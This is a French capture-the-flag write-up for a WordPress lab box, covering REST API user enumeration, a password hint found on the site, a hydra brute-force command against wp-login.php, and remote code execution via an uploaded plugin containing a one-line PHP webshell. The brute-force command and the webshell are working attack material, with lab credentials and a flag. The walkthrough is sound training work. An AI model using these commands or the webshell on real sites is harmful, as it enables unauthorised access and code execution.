# Write-up : "The Very Best"

**Cible :** 10.10.0.X (vhost `viridiancity.epi` — l'IP change à chaque redéploiement)

**Objectif :** Obtenir user.txt

**Difficulté :** Medium

**Date :** 18/09/2026

**Techniques utilisées :** Reconnaissance web, énumération d'utilisateurs WordPress (API REST), OSINT sur le contenu du site, brute force ciblé, RCE via upload de plugin WordPress

**Outils utilisés :** nmap, curl, jq, hydra, python3, zip

---

## 1. Reconnaissance réseau (Nmap)

**Commande :**

```bash
nmap -sV 10.10.0.X
```

**Résultat :**

- `22/tcp` : SSH (OpenSSH)
- `80/tcp` : HTTP (Apache 2.4.68) → **WordPress 7.0**

Le site utilise le nom d'hôte `viridiancity.epi`, on l'ajoute dans `/etc/hosts` (sinon les liens internes et l'API ne répondent pas correctement) :

```bash
echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
```

**Faille exploitée (config) :** virtual host obligatoire — sans le bon en-tête `Host`, on tombe sur le site par défaut.

---

## 2. Énumération des utilisateurs WordPress (API REST)

**Commande :**

```bash
curl -s http://viridiancity.epi/index.php/wp-json/wp/v2/users
```

**Résultat :** un seul compte → **`ash`** (slug = login).

**Faille exploitée :** Fuite d'informations via l'API REST WordPress (CWE-200) — l'endpoint `wp-json/wp/v2/users` expose les auteurs sans authentification.

---

## 3. Indice sur le mot de passe (OSINT du contenu)

En lisant la page **"About Viridian"**, on trouve la convention de mot de passe de la ville :

> *"the password is the Pokémon's species name written entirely in lowercase, followed immediately by two digits."*

→ le mot de passe = **`<nom de pokémon en minuscules>` + `2 chiffres`**.
Viridian City est en région **Kanto** → le Pokémon est un des **151 de la Gen 1**.

**Faille exploitée :** Politique de mots de passe faible et prévisible (CWE-521 : Weak Password Requirements).

---

## 4. Brute force ciblé du login `ash`

On génère la liste `nom_pokémon + 00→99` (151 × 100 = 15 100 essais), puis :

```bash
hydra -l ash -P poke.txt -t 4 viridiancity.epi \
  http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=login_error'
```

- `-t 4` = peu de threads : une box fragile crashe sa base si on la martèle (et renvoie alors des **faux positifs**).
- `F=login_error` = un échec contient `login_error` dans la réponse.

**Résultat :** **`ash : kakuna67`** ✅

> Détection fiable : un vrai succès renvoie une **redirection 302 vers `/wp-admin`**, pas seulement l'absence de `login_error`.

---

## 5. De l'accès admin à la RCE (upload de plugin)

L'éditeur de thème (`theme-editor.php`) est **bloqué** par la sécurité "loopback" de WordPress : après édition, WP tente de se contacter lui-même pour vérifier l'absence d'erreur fatale ; sur une box isolée ce test échoue et la modif est **annulée**.

On contourne via l'**upload d'un plugin** contenant un webshell (les fichiers du zip sont extraits dans `wp-content/plugins/` **sans même l'activer**) :

```php
<?php
/* Plugin Name: ShellX */
if(isset($_GET['c'])){ system($_GET['c']); }
```

On zippe (`shellx/shellx.php`) et on l'envoie via **Extensions → Ajouter → Téléverser** (ou en POST sur `update.php?action=upload-plugin` avec le nonce).

**Faille exploitée :** Upload de plugin arbitraire menant à l'exécution de code (CWE-434 : Unrestricted Upload of File with Dangerous Type → RCE).

**Vérification :**

```bash
curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=id"
# uid=33(www-data)
```

---

## 6. Récupération du flag

```bash
curl "http://viridiancity.epi/wp-content/plugins/shellx/shellx.php?c=cat+/home/ash/user.txt"
```

**FLAG obtenu :**

```
EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}
```

---

## Résumé des failles exploitées

| #   | Faille                                                    | Catégorie (CWE) |
| --- | -------------------------------------------------------- | --------------- |
| 1   | Énumération d'utilisateurs via l'API REST WordPress      | CWE-200         |
| 2   | Convention de mot de passe faible/prévisible             | CWE-521         |
| 3   | Absence d'anti-brute-force sur `wp-login.php`            | CWE-307         |
| 4   | Upload de plugin arbitraire → RCE                        | CWE-434 / CWE-94|

---

## Chaîne d'exploitation (résumé visuel)

```
wp-json/wp/v2/users → login "ash"
        │
        ▼
Page "About Viridian" → convention : pokémon + 2 chiffres (Kanto = Gen 1)
        │
        ▼
Brute force ciblé (hydra, 15100 combos) → ash:kakuna67
        │
        ▼
wp-admin → theme editor bloqué (loopback) → upload plugin webshell
        │
        ▼
?c=  → RCE en www-data → cat /home/ash/user.txt → FLAG
```

---

## Conclusion

- **Accès initial :** énumération API (`ash`) + indice OSINT de la page About (convention de mot de passe Pokémon).
- **Accès admin :** brute force ciblé et throttlé → `ash:kakuna67`.
- **RCE :** contournement du blocage de l'éditeur de thème via upload d'un plugin webshell.
- **Flag user :** `EPI{4sH_1s_M4yB3_Th3_V3ry_B3st}`

> Leçons : lire le **contenu** du site (l'indice mot de passe y était), **cibler** le brute force (convention + thème Kanto), ne **pas marteler** une box fragile (faux positifs quand la DB crashe), et détecter le succès sur la **redirection 302** — pas sur l'absence de `login_error`.
